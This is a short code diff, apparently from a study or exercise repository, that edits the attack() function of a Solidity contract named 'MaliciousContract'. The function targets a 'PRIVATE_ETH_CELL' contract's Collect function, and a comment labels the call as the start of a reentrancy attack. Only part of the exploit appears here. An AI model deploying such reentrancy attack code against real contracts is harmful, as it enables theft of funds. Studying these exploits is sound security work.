@@ -11,12 +11,12 @@ contract MaliciousContract {
         privateETHCell = PRIVATE_ETH_CELL(_privateETHCell);
     }
 
-    function attack() public payable {
+    function attack(uint amount) public  {
         require(!attackInitiated, "Attack already initiated");
 
         // Call the vulnerable function to start the reentrancy attack
-        require(msg.value >= 1 ether, "Must send at least 1 ether");
-        privateETHCell.Collect(msg.value);
+        require(amount >= 1 ether, "Must send at least 1 ether");
+        privateETHCell.Collect(amount);
 
         attackInitiated = true;
     }
